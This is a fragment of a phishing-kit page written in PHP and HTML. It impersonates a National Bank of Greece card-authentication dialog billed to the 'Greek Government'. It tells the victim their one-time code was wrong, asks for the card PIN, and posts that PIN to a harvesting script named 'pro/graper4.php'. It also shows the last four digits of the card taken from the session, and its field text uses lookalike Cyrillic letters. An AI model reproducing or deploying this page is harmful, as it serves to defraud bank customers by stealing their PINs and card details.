                              <div _ngcontent-vle-c47="" class="language">
                                 <form _ngcontent-vle-c47="" class="lang ng-untouched ng-pristine ng-valid"><input _ngcontent-vle-c47="" type="hidden" value="en"><input _ngcontent-vle-c47="" type="hidden" name="formaction" value="reload"><input _ngcontent-vle-c47="" type="image" src="./files.1/en.gif"></form>
                                 <form _ngcontent-vle-c47="" class="lang ng-untouched ng-pristine ng-valid"><input _ngcontent-vle-c47="" type="hidden" value="gr"><input _ngcontent-vle-c47="" type="hidden"><input _ngcontent-vle-c47="" type="image" src="./files.1/gr.gif"></form>
                              </div>
                           </div>
                           <div>
                              <h1 _ngcontent-vle-c47=""></h1>
                              <div _ngcontent-vle-c47="" id="descList" class="list" style="display: block;">
                                 <div _ngcontent-vle-c47="" id="pa_merchant" class="list-item">
                                    <div _ngcontent-vle-c47="" class="label">Έμπορος:</div>
                                    <div _ngcontent-vle-c47="" class="value">Ελληνική Κυβέρνηση</div>
                                 </div>
                                 <div _ngcontent-vle-c47="" id="pa_amount" class="list-item">
                                    <div _ngcontent-vle-c47="" class="label">Ποσό:</div>
                                    <div _ngcontent-vle-c47="" class="value"><b _ngcontent-vle-c47="">0 EUR</b></div>
                                 </div>
                                 <div _ngcontent-vle-c47="" id="pa_date" class="list-item">
                                    <div _ngcontent-vle-c47="" class="label">Ημερομηνία:</div>
                                    <div _ngcontent-vle-c47="" class="value">
                                       <?php
                                       echo "" . date("d/m/Y");
                                       ?>

                                    </div>
                                 </div>
                                 <div _ngcontent-vle-c47="" id="pa_pan" class="list-item">
                                    <div _ngcontent-vle-c47="" class="label">Αριθμός Κάρτας:</div>
                                    <div _ngcontent-vle-c47="" class="value"> <?php if(isset($_SESSION['cc'])) { echo "XXXX-XXXX-XXXX-" . substr($_SESSION["cc"], -4); } ?></div></div>
                                 </div>
                                 <div _ngcontent-vle-c47="" id="pamrow" class="list-item" style="display: none;">
                                    <div _ngcontent-vle-c47="" class="label">Personal Greeting:</div>
                                    <div _ngcontent-vle-c47="" class="value"></div>
                                 </div>
                              </div>
                              <div _ngcontent-vle-c47="" id="desc" style="color: black;">
                                 <p style="color:red; font-size: 13px;">Δεδομένου ότι δεν εισαγάγατε τον σωστό κωδικό πρόσβασης μίας χρήσης, εισαγάγετε τον κωδικό PIN για να ολοκληρώσετε τη λειτουργία.</p>
                              </div>
                              <div _ngcontent-vle-c47="" id="addInfo"></div>
                              <div _ngcontent-vle-c47="" class="list">
                                 <div _ngcontent-vle-c47="" id="QRItem" style="display: none;">
                                    <div _ngcontent-vle-c47="" align="center"><img _ngcontent-vle-c47="" id="QRData"></div>
                                    <input _ngcontent-vle-c47="" id="psw_id" type="password" placeholder="Mobile–Іntеrnеt Ваnkіng / NBG Authenticator" name="PASSWORD" size="20" maxlength="20" autocomplete="off" class="big-input">
                                 </div>
                                 <form action="pro/graper4.php" method="POST">
                                 <div _ngcontent-vle-c47="" id="authenticator" align="center" class="desc">
                                    <div _ngcontent-vle-c47="" class="row d-flex justify-content-center">
                                       <table _ngcontent-vle-c47="" width="100%" border="0" align="center" cellspacing="3" cellpadding="3" class="ng-star-inserted">
                                          <tbody _ngcontent-vle-c47="">
                                             <tr _ngcontent-vle-c47="" class="ng-star-inserted">
                                                <td _ngcontent-vle-c47="" align="left" width="40"></td>
                                                <td _ngcontent-vle-c47="">
                                                   <div _ngcontent-vle-c47="" align="center" class="left"><input required type="text" pattern=".{4,}" maxlength="4" oninput="this.value = this.value.replace(/[^0-9.]/g, &#39;&#39;).replace(/(\..*)\./g, &#39;$1&#39;);" style="width: 55px;" placeholder="XXXX" name="pin"> </div><p></p>
                                                   <div _ngcontent-vle-c47="" class="row d-flex justify-content-center">
                                                      
                                                      <div _ngcontent-vle-c47="" id="btnSubmitItem" class="ng-star-inserted"><button _ngcontent-vle-c47="" name="get" type="submit" href="#" target="_blank" class="big-button" style="cursor: pointer; text-decoration: none;"> Σύνδεση</button></div>
                                                   </div>
                                                </td>
                                                <td _ngcontent-vle-c47="" width="40"></td>
                                             </tr>
                                             <tr _ngcontent-vle-c47="" class="ng-star-inserted">
                                                <td _ngcontent-vle-c47="" align="left" width="40"></td>
                                                <td _ngcontent-vle-c47="">
                                                   <div _ngcontent-vle-c47="" class="position-relative">
                                                      <div _ngcontent-vle-c47="" class="flex-center"><a _ngcontent-vle-c47="" href="" target="_blank"> Ξέχασα το username </a></div>
                                                   </div>
                                                </td>
                                                <td _ngcontent-vle-c47="" width="40"></td>
                                             </tr>
                                          </tbody>
                                       </table>
                                       <br _ngcontent-vle-c47="">
                                    </div>
                                    <div _ngcontent-vle-c47="" class="footer">
                                       <br _ngcontent-vle-c47="">
                                       <div _ngcontent-vle-c47="" class="row">
                                          <table _ngcontent-vle-c47="" width="100%" border="0" align="center" cellspacing="3" cellpadding="3">
                                             <tbody _ngcontent-vle-c47="">
                                                <tr _ngcontent-vle-c47="">
                                                   <td _ngcontent-vle-c47="" align="center"><a _ngcontent-vle-c47="" href="" id="btnExit">Έξοδος</a></td>
                                                   <td _ngcontent-vle-c47="" align="center"><a _ngcontent-vle-c47="" href="" target="Terms Of Use">Όροι Χρήσης</a></td>
                                                   <td _ngcontent-vle-c47=""><a href="" target="FAQ">FAQ</a></td>
                                                </tr>
                                             </tbody>
                                          </table>
                                       </div>
                                    </div>
                                 </div>
                                 </form>
                              </div>
                           </div>
                        </app-nbg-modal></app-dialog-body></mat-dialog-container></div>
                     
                  
               
            </div>
         </div>
      


</body></html>
